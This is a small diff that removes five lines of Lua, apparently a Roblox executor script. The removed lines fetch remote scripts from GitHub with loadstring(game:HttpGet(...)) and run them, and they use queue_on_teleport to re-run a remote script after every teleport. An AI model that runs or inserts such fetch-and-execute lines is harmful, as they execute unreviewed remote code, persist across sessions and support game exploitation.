@@ -1,5 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/NA%20testing.lua", true))()
-
-if queue_on_teleport then
-    queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/7dksbpxuw8/Use/main/Test'))()")
-end
